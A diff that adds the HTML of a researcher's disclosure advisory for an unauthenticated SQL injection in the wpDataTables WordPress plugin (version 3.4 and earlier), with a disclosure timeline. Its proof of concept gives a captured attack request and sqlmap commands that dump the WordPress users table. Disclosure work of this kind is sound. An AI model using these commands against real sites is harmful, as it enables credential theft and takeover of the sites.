@@ -1,0 +1,325 @@
+<!doctype html>
+
+<html lang="en-us">
+
+<head>
+  <title>WordPress Plugin wpDataTables - SQL Injection - The Tales of N4nj0</title>
+  <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<meta name="description" content="The HTML5 Herald" />
+<meta name="author" content="Veno Eivazian" /><meta property="og:title" content="WordPress Plugin wpDataTables - SQL Injection" />
+<meta property="og:description" content="TL;DR Me and my colleague Massimiliano Ferraresi have found an unauthenticated SQL Injection on wpDataTables version &lt;= 3.4 on the table search parameter order.
+Plugin Information  Organization Name: TMS Web Page: https://tms-outsource.com Vulnerability Disclosure Info or Technical Support Web Page: https://tmsplugins.ticksy.com/submit/#100004195 Plugin name: wpDataTables Plugin version: &lt;= 3.4 Plugin Web Page: https://wpdatatables.com  wpDataTables is a best-selling WordPress table plugin which makes very easy to work with tables, charts and data management." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://n4nj0.github.io/advisories/wordpress-plugin-wpdatatables-i/" />
+<meta property="article:published_time" content="2021-02-04T10:15:00&#43;01:00"/>
+<meta property="article:modified_time" content="2021-02-04T10:15:00&#43;01:00"/>
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="WordPress Plugin wpDataTables - SQL Injection"/>
+<meta name="twitter:description" content="TL;DR Me and my colleague Massimiliano Ferraresi have found an unauthenticated SQL Injection on wpDataTables version &lt;= 3.4 on the table search parameter order.
+Plugin Information  Organization Name: TMS Web Page: https://tms-outsource.com Vulnerability Disclosure Info or Technical Support Web Page: https://tmsplugins.ticksy.com/submit/#100004195 Plugin name: wpDataTables Plugin version: &lt;= 3.4 Plugin Web Page: https://wpdatatables.com  wpDataTables is a best-selling WordPress table plugin which makes very easy to work with tables, charts and data management."/>
+
+<meta name="generator" content="Hugo 0.54.0" />
+    
+
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" integrity="sha256-l85OmPOjvil/SOvVt3HnSSjzF1TUMyT9eV0c2BzEGzU=" crossorigin="anonymous" />
+  <link rel="stylesheet" href="https://n4nj0.github.io/fontawesome/css/all.min.css" />
+  
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto+Slab|Ruda" />
+  
+  
+  <link rel="stylesheet" type="text/css" href="/css/styles.css" /></head>
+
+<body>
+  <div id="container">
+    <header>
+      <h1>
+                <a href="/">The Tales of N4nj0</a>
+            </h1>
+
+      <ul id="social-media">
+             <li>
+               <a href="https://github.com/n4nj0" title="GitHub">
+               <i class="fab fa-github fa-lg"></i>
+               </a>
+             </li>
+             <li>
+               <a href="https://linkedin.com/in/venoeivazian" title="LinkedIn">
+               <i class="fab fa-linkedin fa-lg"></i>
+               </a>
+             </li>
+      </ul>
+      
+    </header>
+
+    
+<nav>
+    <ul>
+        
+        <li>
+            <a class="active" href="/advisories/">
+                <i class="fa-li fa  fa-lg"></i><span>Advisories</span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="" href="/posts/">
+                <i class="fa-li fa  fa-lg"></i><span>Posts</span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="" href="/whoami/">
+                <i class="fa-li fa  fa-lg"></i><span>whoami</span>
+            </a>
+        </li>
+        
+    </ul>
+</nav>
+
+
+    <main>
+
+
+
+
+<article>
+
+    <h1>WordPress Plugin wpDataTables - SQL Injection</h1>
+
+    
+      <aside>
+    <ul>
+        <li>
+            <time class="post-date" datetime="2021-02-04T10:15:00&#43;01:00">Feb 4, 2021</time>
+        </li>
+        
+        
+
+        
+
+        <li>5 minutes read</li>
+    </ul>
+</aside>
+
+    
+
+    
+<div class="featured_image">
+    <a href="https://n4nj0.github.io/advisories/wordpress-plugin-wpdatatables-i/" title="WordPress Plugin wpDataTables - SQL Injection">
+        <img src="">
+    </a>
+</div>
+
+
+
+    
+
+<h2 id="tl-dr">TL;DR</h2>
+
+<p>Me and my colleague Massimiliano Ferraresi have found an unauthenticated SQL Injection on wpDataTables version &lt;= 3.4 on the table search parameter <strong>order</strong>.</p>
+
+<h2 id="plugin-information">Plugin Information</h2>
+
+<ul>
+<li><strong>Organization Name:</strong> TMS</li>
+<li><strong>Web Page:</strong> <a href="https://tms-outsource.com">https://tms-outsource.com</a></li>
+<li><strong>Vulnerability Disclosure Info or Technical Support Web Page:</strong> <a href="https://tmsplugins.ticksy.com/submit/#100004195">https://tmsplugins.ticksy.com/submit/#100004195</a></li>
+<li><strong>Plugin name:</strong> wpDataTables</li>
+<li><strong>Plugin version:</strong> &lt;= 3.4</li>
+<li><strong>Plugin Web Page:</strong> <a href="https://wpdatatables.com">https://wpdatatables.com</a></li>
+</ul>
+
+<p>wpDataTables is a best-selling WordPress table plugin which makes very easy to work with tables, charts and data management. It is currently used by 40,000+ companies and individuals in financial, scientific, statistical, commercial and other sectors.</p>
+
+<p>During a quick security auditing of the product, we have found that in the default configuration, a simple table can be published in a page that does not require authentication. The table can be searched, and is vulnerable to SQL Injection on the <strong>order</strong> parameter.</p>
+
+<p>The fix was developed with the release 3.4.1, the day after our vulnerability disclosure. That&rsquo;s a very professional way to handle a high impact security vulnerability! We are so glad to collaborate with them.</p>
+
+<h2 id="vulnerability-details">Vulnerability Details</h2>
+
+<h3 id="improper-neutralization-of-special-elements-used-in-an-sql-command-sql-injection-cwe-89"><strong>Improper Neutralization of Special Elements used in an SQL Command (&lsquo;SQL Injection&rsquo;) - CWE-89</strong></h3>
+
+<ul>
+<li><strong>Summary:</strong> An unauthenticated user can perform a SQL injection attack to access all the data in the database and obtain access to the WordPress application.</li>
+<li><strong>Prerequisites:</strong> A simple table with default settings needs to be created and published in a page on WordPress.</li>
+<li><strong>CVE and CVSS Score:</strong> <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26754">CVE-2021-26754</a> | <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-26754"><strong>N/A</strong> (N/A)</a></li>
+</ul>
+
+<p><strong>Step-by-step instructions and PoC</strong></p>
+
+<p>First, it is necessary to create a simple table with two columns and two rows. Then, the page can be published with default settings.<br />
+An unauthenticated user that visits the page where the table is published can perform a SQL injection attack in the table search parameter <strong>order[0][dir]</strong>.</p>
+
+<p><strong>Affected Endpoints</strong></p>
+
+<ul>
+<li><strong>URL:</strong> <a href="http://hostname/wp-admin/admin-ajax.php?action=get_wdtable&amp;table_id=1">http://hostname/wp-admin/admin-ajax.php?action=get_wdtable&amp;table_id=1</a></li>
+<li><strong>HTTP Parameter:</strong> order[0][dir]</li>
+</ul>
+
+<p>Below are the evidences with the vulnerability details and the payloads used.</p>
+
+<p>The starting point is a standard installation of WordPress version 5.6 (the latest), with a fresh install of the wpDataTables plugin, without further configuration. After the plugin installation, it is necessary to create a simple table used for the vulnerability PoC.</p>
+
+<p>To create the table, login to WordPress as <strong>admin</strong>.<br />
+Under <strong>wpDataTables</strong> -&gt; <strong>Create a Table</strong>, select <strong>Create a data table manually</strong> and then <strong>Next</strong>.</p>
+
+<p><img src="/images/18057ef8f7a7d086bfbe9ee37ac9e46a.png" alt="Creation of the table (1)" /></p>
+
+<p>The table can have simple data, like the following:</p>
+
+<ul>
+<li><strong>Table name:</strong> products</li>
+<li><strong>Number of columns:</strong> 2</li>
+<li><strong>Column 1:</strong>
+
+<ul>
+<li><strong>Name:</strong> name</li>
+<li><strong>Type:</strong> One line string</li>
+</ul></li>
+<li><strong>Column 2:</strong>
+
+<ul>
+<li><strong>Name:</strong> price</li>
+<li><strong>Type:</strong> Integer</li>
+</ul></li>
+</ul>
+
+<p>Add the table data via the web interface:</p>
+
+<p><img src="/images/26aa9c7f9d8767ad9db0cf57f1eafd6d.png" alt="Creation of the table (2)" /></p>
+
+<p>Confirm the table with <strong>Create the table</strong> -&gt; <strong>Open in Excel-like editor</strong><br />
+Insert two rows with some data , like the following picture, then confirm with <strong>Save Changes</strong>:</p>
+
+<p><img src="/images/0a4a1693d5639add992b75de562cb4b1.png" alt="Creation of the table (3)" /></p>
+
+<p>Copy the shortcode to the clipboard.</p>
+
+<p><img src="/images/6238ba8bf4e1c295f29b9990cdf9a606.png" alt="Creation of the table (4)" /></p>
+
+<p>Then, create or edit a simple page on WordPress.<br />
+In this PoC, it is chosen to edit the default page.<br />
+Navigate to: <strong>Pages</strong> -&gt; <strong>Sample Page</strong> -&gt; <strong>Edit</strong></p>
+
+<p><img src="/images/132f66eee95f83493c49f25bb78a855e.png" alt="Creation of the page (1)" /></p>
+
+<p>Paste the page shortcode, in this case: <strong>[wpdatatable id=1]</strong><br />
+Then, click on <strong>Update</strong> to save the page.</p>
+
+<p><img src="/images/33aa96a336b788c7d43069cd2968f7ed.png" alt="Creation of the page (2)" /></p>
+
+<p>The link of the page will be: <strong><a href="http://hostname/sample-page/">http://hostname/sample-page/</a></strong></p>
+
+<p>Then, log out from the web application.</p>
+
+<p><img src="/images/637be790f81e4d7b42810dcbce7b3161.png" alt="Logout from WordPress" /></p>
+
+<p>Go on the page <strong><a href="http://hostname/sample-page/">http://hostname/sample-page/</a></strong>.<br />
+Intercept the browser session with a proxy like <a href="https://portswigger.net/burp"><strong>Burp Suite</strong></a>.<br />
+Write <strong>test</strong> in the <strong>name</strong> search field:</p>
+
+<p><img src="/images/cedea38098abea0b260ac6757c21a8cc.png" alt="Search" /></p>
+
+<p>The request on Burp Suite will be like the next screenshot.<br />
+Please note that there are not WordPress session cookies because it is not necessary to be authenticated for the exploitation of the vulnerability.</p>
+
+<p><img src="/images/ca0cba7c97c1c8565f1f8c48798130e6.png" alt="Burp - Search request" /></p>
+
+<p>Copy the intercepted request, and paste the content a text file named <strong>search.req</strong>, similar to the following one:</p>
+
+<pre><code>POST /wp-admin/admin-ajax.php?action=get_wdtable&amp;table_id=1 HTTP/1.1
+Host: hostname
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 800
+Origin: http://hostname
+Connection: close
+Referer: http://hostname/sample-page/
+Cookie: wordpress_test_cookie=WP+Cookie+check
+
+draw=15&amp;columns%5B0%5D%5Bdata%5D=0&amp;columns%5B0%5D%5Bname%5D=wdt_ID&amp;columns%5B0%5D%5Bsearchable%5D=true&amp;columns%5B0%5D%5Borderable%5D=true&amp;columns%5B0%5D%5Bsearch%5D%5Bvalue%5D=&amp;columns%5B0%5D%5Bsearch%5D%5Bregex%5D=false&amp;columns%5B1%5D%5Bdata%5D=1&amp;columns%5B1%5D%5Bname%5D=name&amp;columns%5B1%5D%5Bsearchable%5D=true&amp;columns%5B1%5D%5Borderable%5D=true&amp;columns%5B1%5D%5Bsearch%5D%5Bvalue%5D=test&amp;columns%5B1%5D%5Bsearch%5D%5Bregex%5D=false&amp;columns%5B2%5D%5Bdata%5D=2&amp;columns%5B2%5D%5Bname%5D=price&amp;columns%5B2%5D%5Bsearchable%5D=true&amp;columns%5B2%5D%5Borderable%5D=true&amp;columns%5B2%5D%5Bsearch%5D%5Bvalue%5D=&amp;columns%5B2%5D%5Bsearch%5D%5Bregex%5D=true&amp;order%5B0%5D%5Bcolumn%5D=1&amp;order%5B0%5D%5Bdir%5D=asc&amp;start=0&amp;length=10&amp;search%5Bvalue%5D=&amp;search%5Bregex%5D=false&amp;wdtNonce=c474be8990&amp;sRangeSeparator=%7C
+</code></pre>
+
+<p>Then, use the <a href="http://sqlmap.org"><strong>SQLMap</strong></a> tool to exploit the vulnerability with the following command:</p>
+
+<pre><code>sqlmap -r search.req --level=5 --risk=3 --random-agent --dbms=mysql -p 'order[0][dir]' --banner
+</code></pre>
+
+<p>The banner of the database is gathered as PoC of the vulnerability:</p>
+
+<p><img src="/images/931cc311b89df01194096c30176e3481.png" alt="SQLMap - Banner" /></p>
+
+<p>It is possible to dump all the WordPress database to extract the credentials. If a successful password cracking attack is accomplished, an attacker can use the credentials to login to the WordPress admin page.<br />
+To extract the <strong>wp_users</strong> table, use the following command:</p>
+
+<pre><code>sqlmap -r search.req --level=5 --risk=3 --random-agent --dbms=mysql -p 'order[0][dir]' -D wordpress -T wp_users --dump
+</code></pre>
+
+<p><img src="/images/e0c811e1a0f46087662cb676ac5ab1f8.png" alt="SQLMap - Database dump" /></p>
+
+<p>The vulnerability is tested on wpDataTables version 3.3, as depicted by the following screenshot:</p>
+
+<p><img src="/images/4e926145767259dd9b66ad507e7d4e4f.png" alt="Vulnerable version confirmation - wpDataTables 3.3" /></p>
+
+<p><strong>Security Impact</strong></p>
+
+<p>By exploiting this issue an attacker is able to access all the data in the database and obtain access to the WordPress application, because all the data, including WordPress credentials, can be extracted and cracked.<br />
+It is important to note that a valid WordPress administrator account is also able to execute Remote Code Execution attack because of the capability of installing or modifying existing plugins or themes via the web interface. This scenario allows the entire compromise of the target operating system where wpDataTables is installed.</p>
+
+<h2 id="timeline">Timeline</h2>
+
+<ul>
+<li><strong>01/02/2020</strong>: First disclosure via private ticket on the Technical Support Web Page.</li>
+<li><strong>01/02/2020</strong>: Near real-time human acknowledge e-mail from Technical Support!</li>
+<li><strong>02/02/2020</strong>: Released the version 3.4.1, which has the fix for the vulnerability. Very impressive&hellip;</li>
+<li><strong>03/02/2020</strong>: Update is given that the vulnerability is fixed on version 3.4.1, which was released the day before.</li>
+<li><strong>03/02/2020</strong>: We have tested the vulnerability on version 3.4.1, which is fixed correctly.</li>
+<li><strong>04/02/2020</strong>: Updated changelog with credits: <a href="https://wpdatatables.com/help/whats-new-changelog/">https://wpdatatables.com/help/whats-new-changelog/</a></li>
+</ul>
+
+
+</article>
+
+
+<section class="post-nav">
+    <ul>
+        
+        <li>
+            <a href="https://n4nj0.github.io/advisories/ca-ehealth-performance-manager/"><i class="fa fa-chevron-circle-left"></i> CA eHealth Performance Manager - Multiple Vulnerabilities</a>
+        </li>
+        
+        
+        <li>
+            <a href="https://n4nj0.github.io/advisories/nedi-multiple-vulnerabilities-i/">NeDi 1.9C - Multiple Vulnerabilities <i class="fa fa-chevron-circle-right"></i> </a>
+        </li>
+        
+    </ul>
+</section>
+  
+    
+    
+  
+
+
+
+
+
+<footer>
+  <div>
+    <p>
+      <h6>
+      &copy; 2020 Veno Eivazian.
+      <a href="https://creativecommons.org/licenses/by/3.0/" title="Creative Commons Attribution">Some rights reserved</a>;
+      please attribute properly and link back.
+      </h6>
+    </p>
+  </div>
+</footer>
+
